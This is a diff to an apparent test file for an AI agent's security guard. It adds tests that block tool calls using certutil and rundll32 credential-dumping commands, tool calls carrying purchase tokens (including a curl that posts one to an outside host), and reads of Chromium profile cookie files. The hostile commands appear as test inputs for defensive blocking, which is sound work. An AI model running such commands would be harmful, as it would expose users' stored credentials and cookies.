@@ -12,6 +12,7 @@ import {
   ALWAYS_DISALLOWED_TOOLS,
   buildOpencodeAbsoluteBlockPermission,
   classifyAbsoluteBlock,
+  classifyChromiumTokenAccess,
   looksLikeSecretPath,
   stripBashHeredocs,
   stripBashStringContent,
@@ -272,6 +273,14 @@ describe("classifyAbsoluteBlock", () => {
       ["security find-internet-password"],
       ["secret-tool lookup name db"],
       ["cmdkey /list"],
+      // MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §7.11 — Windows DPAPI
+      // surfaces. `certutil` exports certificate + DPAPI blobs;
+      // `rundll32.exe` is the canonical vault.dll / cryptui.dll load
+      // path for credential dumping. No legitimate Aitne skill calls
+      // either; blanket-deny so Windows owners on allow mode close the
+      // same vector macOS/Linux block via `security` / `secret-tool`.
+      ["certutil -decode encoded.txt out.bin"],
+      ["rundll32.exe keymgr.dll, KRShowKeyMgr"],
     ])("matches %s", (cmd) => {
       const m = classifyAbsoluteBlock("Bash", cmd);
       expect(m?.category).toBe("secret_cli");
@@ -383,6 +392,54 @@ describe("classifyAbsoluteBlock", () => {
 
     it("returns null for Edit to a non-secret path", () => {
       expect(classifyAbsoluteBlock("Edit", "src/index.ts")).toBeNull();
+    });
+  });
+
+  describe("purchase token echo (§17.7)", () => {
+    // The PURCHASE_TOKEN_EMBED pattern (`!~[A-Z2-7]{8}`) is the canonical
+    // B-4 purchase-confirmation token shape from
+    // MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §17.7. The absolute-block
+    // layer must refuse any agent-tool call whose arg contains one,
+    // across Bash / Read / Write / Edit — even embedded as a substring
+    // of a JSON body or path — and redact the matched token in the
+    // returned match.
+    it.each([
+      ["Bash", "curl -d '{\"note\":\"!~ABCDEFGH\"}' https://x"],
+      ["Bash", "echo \"!~A2B4C6D7\""],
+      ["Read", "/tmp/purchase-!~ZZ234567.log"],
+      ["Write", "notes/!~ABCDEFGH.md"],
+      ["Edit", "drafts/!~Z2B4C6D7.txt"],
+    ])("%s — classifies token-bearing arg as purchase_token_echo", (tool, arg) => {
+      const m = classifyAbsoluteBlock(tool, arg);
+      expect(m?.category).toBe("purchase_token_echo");
+      expect(m?.redacted).toMatch(/^!~\*{4}[A-Z2-7]{3}$/);
+    });
+
+    it("redaction preserves the first two and last three chars of the matched token only", () => {
+      const m = classifyAbsoluteBlock("Bash", "echo !~ABCDEFGH | wc -c");
+      // Token is `!~ABCDEFGH`; slice(0,2)='!~', slice(-3)='FGH'.
+      expect(m?.redacted).toBe("!~****FGH");
+    });
+
+    it("does not match a near-token that fails the base32 alphabet (lowercase)", () => {
+      // Lowercase letters and 0/1/8/9 are NOT in the base32 alphabet
+      // PURCHASE_TOKEN_EMBED expects — they must not trip the rule.
+      expect(classifyAbsoluteBlock("Bash", "echo !~abcdefgh")).toBeNull();
+      expect(classifyAbsoluteBlock("Read", "log/!~01234567.txt")).toBeNull();
+    });
+
+    it("does not match a short near-token (under 8 base32 chars)", () => {
+      // PURCHASE_TOKEN_EMBED is non-anchored — it greedily matches any
+      // 8-char base32 run embedded in a larger string (e.g. an attacker
+      // smuggling the token inside a JSON body). A token with FEWER than
+      // 8 base32 chars therefore must not trip the classifier.
+      expect(classifyAbsoluteBlock("Bash", "echo !~ABCDEFG")).toBeNull(); // 7 chars
+    });
+
+    it("does not apply to tool names outside the §17.7 dispatch set", () => {
+      // The branch is gated to Bash/Read/Write/Edit. A non-matching tool
+      // returns null even when the arg carries a token.
+      expect(classifyAbsoluteBlock("WebFetch", "https://x?t=!~ABCDEFGH")).toBeNull();
     });
   });
 
@@ -1010,5 +1067,55 @@ describe("stripBashStringContent — adversarial inputs", () => {
     expect(stripped).not.toContain("sudo");
     expect(stripped).not.toContain("doas");
     expect(stripped).not.toContain("rm -rf");
+  });
+});
+
+describe("classifyChromiumTokenAccess (§7.11 MANAGED_CHROMIUM PreToolUse hook)", () => {
+  it("returns null when the tool arg is empty", () => {
+    expect(classifyChromiumTokenAccess("Bash", undefined)).toBeNull();
+    expect(classifyChromiumTokenAccess("Bash", "")).toBeNull();
+  });
+
+  it("flags a Bash command that reaches into a chromium-sync profile dir", () => {
+    const match = classifyChromiumTokenAccess(
+      "Bash",
+      "cat /Users/me/.personal-agent/chromium-sync/Default/Cookies",
+    );
+    expect(match).not.toBeNull();
+    expect(match?.category).toBe("browser_profile");
+    // The redacted preview is the first token of the (trimmed) command —
+    // command name only, no path payload.
+    expect(match?.redacted).toBe("cat");
+  });
+
+  it("returns null for a Bash command that does not match any browser-profile signal", () => {
+    expect(classifyChromiumTokenAccess("Bash", "echo hello")).toBeNull();
+  });
+
+  it("flags a Read / Write / Edit arg that points at a chromium-sync profile dir", () => {
+    const inside = "/Users/me/.personal-agent/chromium-sync/Default/Cookies";
+    for (const tool of ["Read", "Write", "Edit"] as const) {
+      const match = classifyChromiumTokenAccess(tool, inside);
+      expect(match).not.toBeNull();
+      expect(match?.category).toBe("browser_profile");
+      // The path redaction shortens the absolute path for audit so the
+      // hook does not leak per-user prefixes.
+      expect(match?.redacted).toBeTruthy();
+      expect(match?.redacted).not.toContain("/Users/me/");
+    }
+  });
+
+  it("returns null for a Read arg that doesn't look like a browser profile path", () => {
+    expect(classifyChromiumTokenAccess("Read", "/tmp/notes.md")).toBeNull();
+  });
+
+  it("returns null for a tool name outside the {Bash, Read, Write, Edit} set", () => {
+    // Future-proof: a new tool name flows past the classifier untouched.
+    expect(
+      classifyChromiumTokenAccess(
+        "WebFetch",
+        "/Users/me/.personal-agent/chromium-sync/Default/Cookies",
+      ),
+    ).toBeNull();
   });
 });
